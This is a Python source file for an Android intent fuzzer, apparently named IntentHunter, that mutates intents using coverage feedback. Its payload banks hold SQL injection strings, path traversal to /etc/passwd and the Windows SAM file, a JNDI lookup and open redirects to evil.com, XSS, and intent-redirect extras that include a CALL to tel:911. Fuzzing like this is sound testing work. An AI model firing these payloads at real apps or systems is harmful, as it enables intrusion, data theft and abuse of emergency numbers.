"""Schema-aware intent mutator for IntentHunter.

Generates seed intents from component schemas and mutates them
using coverage-guided strategies: bit flips, type confusion,
overflows, injection payloads, null/empty values, path traversal.
"""
from __future__ import annotations

import random
import string
import struct
from copy import deepcopy
from dataclasses import dataclass, field
from enum import Enum
from typing import Any

from backend.plugins.base import IntentSpec

# Reproducible runs when needed — call seed_rng() to set
_rng = random.Random()


def seed_rng(seed: int) -> None:
    """Set the RNG seed for reproducible mutation sequences."""
    global _rng
    _rng = random.Random(seed)


# ---------------------------------------------------------------------------
# Mutation strategies
# ---------------------------------------------------------------------------

class MutationStrategy(str, Enum):
    BIT_FLIP = "bit_flip"
    TYPE_CONFUSION = "type_confusion"
    OVERFLOW = "overflow"
    NULL_INJECTION = "null_injection"
    EMPTY_STRING = "empty_string"
    SQL_INJECTION = "sql_injection"
    PATH_TRAVERSAL = "path_traversal"
    SPECIAL_CHARS = "special_chars"
    FORMAT_STRING = "format_string"
    INTENT_REDIRECT = "intent_redirect"
    DEEP_LINK_FUZZ = "deep_link_fuzz"
    BOUNDARY_VALUES = "boundary_values"


# ---------------------------------------------------------------------------
# Payload banks
# ---------------------------------------------------------------------------

SQL_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1--",
    "'; DROP TABLE users;--",
    "1' AND SLEEP(5)--",
    "' UNION SELECT NULL,NULL--",
    "\" OR \"\"=\"",
    "1; WAITFOR DELAY '0:0:5'--",
    "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
    "admin'--",
]

PATH_TRAVERSAL_PAYLOADS = [
    "../../../etc/passwd",
    "..%2f..%2f..%2fetc%2fpasswd",
    "....//....//....//etc/passwd",
    "/data/data/TARGET_PKG/shared_prefs/",
    "content://com.android.providers.media.documents/document/raw%3A%2Fdata%2Fdata%2F",
    "file:///data/local/tmp/evil.html",
    "/proc/self/cmdline",
    "..\\..\\..\\windows\\system32\\config\\sam",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
]

SPECIAL_CHAR_PAYLOADS = [
    "\x00",
    "\n\r\n",
    "\t" * 100,
    "\x01\x02\x03\x04\x05",
    "￿" * 10,
    "${jndi:ldap://evil.com/a}",
    "{{7*7}}",
    "<script>alert(1)</script>",
    "\\u0000\\u0001",
    "\x1b[31mRED\x1b[0m",
]

FORMAT_STRING_PAYLOADS = [
    "%s%s%s%s%s%s%s%s%s%s",
    "%n%n%n%n%n",
    "%x%x%x%x",
    "%d" * 50,
    "AAAA%08x.%08x.%08x.%08x",
]

OVERFLOW_STRINGS = [
    "A" * 1024,
    "A" * 4096,
    "A" * 65536,
    "\x41" * 256,
]

OVERFLOW_INTS = [
    0,
    -1,
    1,
    2147483647,       # INT_MAX
    -2147483648,      # INT_MIN
    2147483648,       # INT_MAX + 1
    9999999999999,
    0x7FFFFFFFFFFFFFFF,
]

DEEP_LINK_FUZZ_TEMPLATES = [
    "{scheme}://{host}/../../../etc/passwd",
    "{scheme}://{host}/%00",
    "{scheme}://{host}/?redirect=http://evil.com",
    "{scheme}://{host}/{{{{7*7}}}}",
    "{scheme}://{host}/' OR '1'='1",
    "{scheme}://evil.com@{host}/",
    "{scheme}://{host}#fragment<script>alert(1)</script>",
    "javascript://anything%0aalert(1)",
]


# ---------------------------------------------------------------------------
# MutationEngine
# ---------------------------------------------------------------------------

@dataclass
class MutationRecord:
    """Tracks a mutation for coverage-guided feedback loop."""
    original: IntentSpec
    mutated: IntentSpec
    strategy: MutationStrategy
    field_mutated: str = ""
    triggered_new_coverage: bool = False


class MutationEngine:
    """Coverage-guided intent mutation engine.

    Generates seed intents from component schema, then mutates them
    with various strategies. Coverage-guided mutation amplifies intents
    that trigger new code paths.
    """

    def __init__(self, package_name: str = ""):
        self.package_name = package_name
        self._mutation_history: list[MutationRecord] = []
        self._high_value_intents: list[IntentSpec] = []
        self._max_history = 500  # Cap history for memory

    def generate_seeds(self, component: dict[str, Any]) -> list[IntentSpec]:
        """Generate initial seed intents from component info.

        Args:
            component: Dict with keys: name, component_type, intent_filters,
                       deep_links, permission, metadata.

        Returns:
            List of seed IntentSpec objects covering the component's attack surface.
        """
        seeds: list[IntentSpec] = []
        comp_name = component.get("name", "")
        comp_type = component.get("component_type", "activity")
        intent_filters = component.get("intent_filters", [])
        deep_links = component.get("deep_links", [])

        # Seed 1: Direct component invocation (explicit intent)
        seeds.append(IntentSpec(
            component=f"{self.package_name}/{comp_name}" if self.package_name else comp_name,
        ))

        # Seeds from intent filters
        for filt in intent_filters:
            actions = filt.get("actions", []) if isinstance(filt, dict) else getattr(filt, "actions", [])
            categories = filt.get("categories", []) if isinstance(filt, dict) else getattr(filt, "categories", [])
            data_schemes = filt.get("data_schemes", []) if isinstance(filt, dict) else getattr(filt, "data_schemes", [])
            data_hosts = filt.get("data_hosts", []) if isinstance(filt, dict) else getattr(filt, "data_hosts", [])
            data_paths = filt.get("data_paths", []) if isinstance(filt, dict) else getattr(filt, "data_paths", [])
            mime_types = filt.get("data_mime_types", []) if isinstance(filt, dict) else getattr(filt, "data_mime_types", [])

            for action in actions:
                spec = IntentSpec(
                    action=action,
                    component=f"{self.package_name}/{comp_name}" if self.package_name else comp_name,
                    category=categories[0] if categories else "",
                )

                # Add data URI if scheme+host available
                if data_schemes and data_hosts:
                    path = data_paths[0] if data_paths else ""
                    spec.data_uri = f"{data_schemes[0]}://{data_hosts[0]}{path}"
                elif data_schemes:
                    spec.data_uri = f"{data_schemes[0]}://test"

                if mime_types:
                    spec.mime_type = mime_types[0]

                seeds.append(spec)

        # Seeds from deep links
        for dl in deep_links:
            seeds.append(IntentSpec(
                action="android.intent.action.VIEW",
                data_uri=dl,
                category="android.intent.category.BROWSABLE",
            ))

        # Add common extras for the component type
        seeds.extend(self._generate_extra_seeds(comp_name, comp_type, seeds))

        return seeds

    def _generate_extra_seeds(
        self, comp_name: str, comp_type: str, base_seeds: list[IntentSpec]
    ) -> list[IntentSpec]:
        """Generate additional seeds with common extras patterns."""
        extra_seeds: list[IntentSpec] = []

        # Common extra key patterns per component type
        common_extras: dict[str, list[tuple[str, Any]]] = {
            "activity": [
                ("url", "https://example.com"),
                ("uri", "https://example.com"),
                ("path", "/test"),
                ("query", "test"),
                ("user_id", "1"),
                ("id", 1),
                ("token", "test_token"),
                ("data", '{"key": "value"}'),
                ("redirect_url", "https://evil.com"),
                ("debug", True),
            ],
            "service": [
                ("command", "start"),
                ("action", "process"),
                ("data", "test"),
                ("id", 1),
            ],
            "receiver": [
                ("message", "test"),
                ("data", "test"),
                ("command", "exec"),
            ],
            "provider": [],
        }

        extras_list = common_extras.get(comp_type, common_extras["activity"])

        if base_seeds and extras_list:
            base = deepcopy(base_seeds[0])
            for key, value in extras_list:
                base.extras[key] = value
            extra_seeds.append(base)

        return extra_seeds

    def mutate(self, intent: IntentSpec, strategy: MutationStrategy | None = None) -> IntentSpec:
        """Apply a single mutation to an intent.

        Args:
            intent: The intent to mutate.
            strategy: Specific strategy. If None, picks randomly.

        Returns:
            New mutated IntentSpec.
        """
        if strategy is None:
            strategy = _rng.choice(list(MutationStrategy))

        mutated = deepcopy(intent)

        mutator_map = {
            MutationStrategy.BIT_FLIP: self._mutate_bit_flip,
            MutationStrategy.TYPE_CONFUSION: self._mutate_type_confusion,
            MutationStrategy.OVERFLOW: self._mutate_overflow,
            MutationStrategy.NULL_INJECTION: self._mutate_null,
            MutationStrategy.EMPTY_STRING: self._mutate_empty,
            MutationStrategy.SQL_INJECTION: self._mutate_sqli,
            MutationStrategy.PATH_TRAVERSAL: self._mutate_path_traversal,
            MutationStrategy.SPECIAL_CHARS: self._mutate_special_chars,
            MutationStrategy.FORMAT_STRING: self._mutate_format_string,
            MutationStrategy.INTENT_REDIRECT: self._mutate_intent_redirect,
            MutationStrategy.DEEP_LINK_FUZZ: self._mutate_deep_link,
            MutationStrategy.BOUNDARY_VALUES: self._mutate_boundary,
        }

        mutator = mutator_map.get(strategy, self._mutate_bit_flip)
        field_mutated = mutator(mutated)

        # Track mutation
        record = MutationRecord(
            original=intent,
            mutated=mutated,
            strategy=strategy,
            field_mutated=field_mutated,
        )
        self._mutation_history.append(record)

        # Cap history
        if len(self._mutation_history) > self._max_history:
            self._mutation_history = self._mutation_history[-self._max_history // 2:]

        return mutated

    def coverage_guided_mutate(
        self, intent: IntentSpec, coverage_delta: int
    ) -> list[IntentSpec]:
        """Generate more aggressive mutations for high-coverage intents.

        When an intent triggers new code paths, we want to explore
        variations of it more thoroughly.

        Args:
            intent: The intent that triggered new coverage.
            coverage_delta: Number of new methods hit.

        Returns:
            List of mutated intents, more mutations for higher delta.
        """
        # Track high-value intent
        if len(self._high_value_intents) < 100:
            self._high_value_intents.append(deepcopy(intent))

        # Scale mutation count by coverage delta
        base_mutations = 3
        extra = min(coverage_delta, 10)
        total = base_mutations + extra

        results: list[IntentSpec] = []

        # Apply every strategy to high-value intents
        strategies = list(MutationStrategy)
        for i in range(total):
            strategy = strategies[i % len(strategies)]
            results.append(self.mutate(intent, strategy))

        # Cross-pollinate: combine extras from different high-value intents
        if len(self._high_value_intents) >= 2:
            donor = _rng.choice(self._high_value_intents)
            hybrid = deepcopy(intent)
            # Merge some extras from donor
            for key, val in donor.extras.items():
                if _rng.random() < 0.5:
                    hybrid.extras[key] = val
            results.append(hybrid)

        return results

    # ------------------------------------------------------------------
    # Mutation strategies
    # ------------------------------------------------------------------

    def _mutate_bit_flip(self, intent: IntentSpec) -> str:
        """Flip random bits in string extras."""
        if not intent.extras:
            intent.extras["fuzz_key"] = "AAAA"

        key = _rng.choice(list(intent.extras.keys()))
        val = intent.extras[key]

        if isinstance(val, str) and val:
            chars = list(val)
            idx = _rng.randint(0, len(chars) - 1)
            original_ord = ord(chars[idx])
            bit_pos = _rng.randint(0, 7)
            chars[idx] = chr(original_ord ^ (1 << bit_pos))
            intent.extras[key] = "".join(chars)
        elif isinstance(val, int):
            bit_pos = _rng.randint(0, 31)
            intent.extras[key] = val ^ (1 << bit_pos)
        elif isinstance(val, float):
            packed = struct.pack("d", val)
            byte_list = bytearray(packed)
            idx = _rng.randint(0, 7)
            byte_list[idx] ^= 1 << _rng.randint(0, 7)
            intent.extras[key] = struct.unpack("d", bytes(byte_list))[0]

        return f"extras.{key}"

    def _mutate_type_confusion(self, intent: IntentSpec) -> str:
        """Send wrong types: int where string expected, etc."""
        if not intent.extras:
            intent.extras["id"] = "normal_string"

        key = _rng.choice(list(intent.extras.keys()))
        val = intent.extras[key]

        if isinstance(val, str):
            # String → int or bool
            intent.extras[key] = _rng.choice([
                _rng.randint(-999, 999),
                True,
                False,
                0,
                -1,
                None,
            ])
        elif isinstance(val, int):
            # Int → string
            intent.extras[key] = _rng.choice([
                "not_a_number",
                "NaN",
                "Infinity",
                "",
                str(val) + "AAAA",
            ])
        elif isinstance(val, bool):
            intent.extras[key] = _rng.choice([2, "true", "yes", 0, ""])
        else:
            intent.extras[key] = _rng.choice(["fuzz", 0, True, ""])

        return f"extras.{key}"

    def _mutate_overflow(self, intent: IntentSpec) -> str:
        """Inject overflow values into extras or URIs."""
        if intent.extras:
            key = _rng.choice(list(intent.extras.keys()))
            val = intent.extras[key]
            if isinstance(val, str):
                intent.extras[key] = _rng.choice(OVERFLOW_STRINGS)
            elif isinstance(val, (int, float)):
                intent.extras[key] = _rng.choice(OVERFLOW_INTS)
            return f"extras.{key}"
        elif intent.data_uri:
            intent.data_uri += _rng.choice(OVERFLOW_STRINGS)
            return "data_uri"
        else:
            intent.extras["overflow_test"] = _rng.choice(OVERFLOW_STRINGS)
            return "extras.overflow_test"

    def _mutate_null(self, intent: IntentSpec) -> str:
        """Inject null bytes and None values."""
        if intent.extras:
            key = _rng.choice(list(intent.extras.keys()))
            intent.extras[key] = _rng.choice([
                "\x00",
                "\x00" * 10,
                "test\x00injected",
            ])
            return f"extras.{key}"
        else:
            intent.extras["null_test"] = "\x00"
            return "extras.null_test"

    def _mutate_empty(self, intent: IntentSpec) -> str:
        """Replace values with empty strings/zero values."""
        if intent.extras:
            key = _rng.choice(list(intent.extras.keys()))
            val = intent.extras[key]
            if isinstance(val, str):
                intent.extras[key] = ""
            elif isinstance(val, (int, float)):
                intent.extras[key] = 0
            elif isinstance(val, bool):
                intent.extras[key] = False
            else:
                intent.extras[key] = ""
            return f"extras.{key}"

        if intent.data_uri:
            intent.data_uri = ""
            return "data_uri"

        intent.extras["empty_test"] = ""
        return "extras.empty_test"

    def _mutate_sqli(self, intent: IntentSpec) -> str:
        """Inject SQL payloads into string extras and URIs."""
        payload = _rng.choice(SQL_PAYLOADS)

        if intent.extras:
            key = _rng.choice(list(intent.extras.keys()))
            val = intent.extras[key]
            if isinstance(val, str):
                intent.extras[key] = val + payload
            else:
                intent.extras[key] = payload
            return f"extras.{key}"
        elif intent.data_uri:
            # Inject into URI query params
            sep = "&" if "?" in intent.data_uri else "?"
            intent.data_uri += f"{sep}q={payload}"
            return "data_uri"
        else:
            intent.extras["query"] = payload
            return "extras.query"

    def _mutate_path_traversal(self, intent: IntentSpec) -> str:
        """Inject path traversal payloads."""
        payload = _rng.choice(PATH_TRAVERSAL_PAYLOADS)
        if self.package_name:
            payload = payload.replace("TARGET_PKG", self.package_name)

        if intent.data_uri:
            # Replace path component
            parts = intent.data_uri.split("://", 1)
            if len(parts) == 2:
                scheme = parts[0]
                rest = parts[1]
                host_end = rest.find("/")
                if host_end >= 0:
                    host = rest[:host_end]
                    intent.data_uri = f"{scheme}://{host}/{payload}"
                else:
                    intent.data_uri = f"{scheme}://{rest}/{payload}"
            return "data_uri"
        elif intent.extras:
            # Pick a key that looks path-like
            path_keys = [k for k in intent.extras if any(w in k.lower() for w in ("path", "file", "uri", "url", "dir"))]
            key = _rng.choice(path_keys) if path_keys else _rng.choice(list(intent.extras.keys()))
            intent.extras[key] = payload
            return f"extras.{key}"
        else:
            intent.extras["path"] = payload
            return "extras.path"

    def _mutate_special_chars(self, intent: IntentSpec) -> str:
        """Inject special/control characters."""
        payload = _rng.choice(SPECIAL_CHAR_PAYLOADS)

        if intent.extras:
            key = _rng.choice(list(intent.extras.keys()))
            val = intent.extras[key]
            if isinstance(val, str):
                intent.extras[key] = val + payload
            else:
                intent.extras[key] = payload
            return f"extras.{key}"
        else:
            intent.extras["special"] = payload
            return "extras.special"

    def _mutate_format_string(self, intent: IntentSpec) -> str:
        """Inject format string payloads."""
        payload = _rng.choice(FORMAT_STRING_PAYLOADS)

        if intent.extras:
            key = _rng.choice(list(intent.extras.keys()))
            intent.extras[key] = payload
            return f"extras.{key}"
        else:
            intent.extras["fmt"] = payload
            return "extras.fmt"

    def _mutate_intent_redirect(self, intent: IntentSpec) -> str:
        """Inject intent redirect / privilege escalation via extras.

        Targets apps that re-dispatch intents from extras (CVE-like).
        """
        evil_component = "com.android.settings/.Settings"
        redirect_extras: dict[str, Any] = {
            "intent": f"intent:#Intent;component={evil_component};end",
            "next_intent": f"#Intent;action=android.intent.action.VIEW;data=https://evil.com;end",
            "forward_intent_extra": f"intent:#Intent;action=android.intent.action.CALL;data=tel:911;end",
        }
        key = _rng.choice(list(redirect_extras.keys()))
        intent.extras[key] = redirect_extras[key]
        return f"extras.{key}"

    def _mutate_deep_link(self, intent: IntentSpec) -> str:
        """Fuzz deep link URIs with injection payloads."""
        if not intent.data_uri:
            intent.data_uri = "https://example.com/test"

        parts = intent.data_uri.split("://", 1)
        scheme = parts[0] if parts else "https"
        rest = parts[1] if len(parts) > 1 else "example.com"
        host = rest.split("/")[0] if "/" in rest else rest

        template = _rng.choice(DEEP_LINK_FUZZ_TEMPLATES)
        intent.data_uri = template.format(scheme=scheme, host=host)
        return "data_uri"

    def _mutate_boundary(self, intent: IntentSpec) -> str:
        """Test boundary values: min/max ints, empty, huge strings."""
        if not intent.extras:
            intent.extras["id"] = 1

        key = _rng.choice(list(intent.extras.keys()))
        val = intent.extras[key]

        if isinstance(val, (int, float)):
            intent.extras[key] = _rng.choice(OVERFLOW_INTS)
        elif isinstance(val, str):
            intent.extras[key] = _rng.choice([
                "",
                " ",
                "0",
                "-1",
                "null",
                "undefined",
                "NaN",
                "true",
                "false",
                "[]",
                "{}",
                _rng.choice(OVERFLOW_STRINGS),
            ])
        elif isinstance(val, bool):
            intent.extras[key] = _rng.choice([0, 1, 2, -1, "true", "false", ""])

        return f"extras.{key}"

    # ------------------------------------------------------------------
    # Utility
    # ------------------------------------------------------------------

    def get_effective_strategies(self) -> list[MutationStrategy]:
        """Return strategies that have triggered new coverage, sorted by effectiveness."""
        strategy_hits: dict[MutationStrategy, int] = {}
        for rec in self._mutation_history:
            if rec.triggered_new_coverage:
                strategy_hits[rec.strategy] = strategy_hits.get(rec.strategy, 0) + 1

        if not strategy_hits:
            return list(MutationStrategy)

        return sorted(strategy_hits.keys(), key=lambda s: strategy_hits[s], reverse=True)

    def mark_coverage_hit(self, intent: IntentSpec) -> None:
        """Mark the most recent mutation of this intent as coverage-triggering."""
        for rec in reversed(self._mutation_history):
            if rec.mutated is intent:
                rec.triggered_new_coverage = True
                break
